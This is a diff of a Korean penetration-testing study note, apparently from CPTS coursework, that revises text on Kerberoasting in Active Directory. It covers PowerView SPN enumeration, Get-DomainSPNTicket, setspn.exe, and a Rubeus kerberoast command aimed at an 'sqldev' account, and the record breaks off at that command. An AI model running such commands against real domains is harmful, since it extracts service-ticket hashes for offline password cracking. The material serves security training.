-우선 위에 방금 본 툴인 파워뷰 툴을 활용하여 사용자 spn 달린거를 가져올수있따:
+Windows에서도 동일한 원리로 SPN 보유 사용자 계정을 열거하고 서비스 티켓을 요청할 수 있다.
+
+먼저 PowerView를 이용해 SPN이 설정된 사용자 계정을 확인할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad12.png)
 
-그리고 이 사용자에 해당하는 spn을 가져올수있다:
+이후 `Get-DomainSPNTicket` 등을 이용하여 대상 사용자에 대한 서비스 티켓을 요청하고 크랙 가능한 형식으로 출력할 수 있다:
 
 ![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad13.png)
 
-그리고 대안으로 setspn 툴을 활용할수도 있다.
+SPN 자체를 확인하는 용도로는 Windows 기본 도구인 `setspn.exe` 도 사용할 수 있다.
 
-그리고 대중적인 rebeus.exe 툴이 존재한다.
+### Rubeus Kerberoasting
 
-이 툴은 해시는 물론 티켓까지 뽑아올수있다.
+Kerberoasting에는 `Rubeus.exe` 도 널리 사용된다.
 
-걍 이번엔 spn 달린 해시를 캐오는 방식으로 실습을 한다.
+Rubeus kerberoast는 대상 SPN의 TGS를 요청한 뒤 오프라인 크랙에 사용할 수 있는 `$krb5tgs$...` 형식으로 출력해준다.
 
-이처럼 sqldev 상대로 해시를 가져오게 할수있다:
+여기서는 `sqldev` 계정만 지정하여 Kerberoasting을 수행한다.
+
+다음과 같이 실행할 수 있다:
 
 ```powershell
 PS C:\tools> .\Rubeus.exe kerberoast /user:sqldev /nowrap
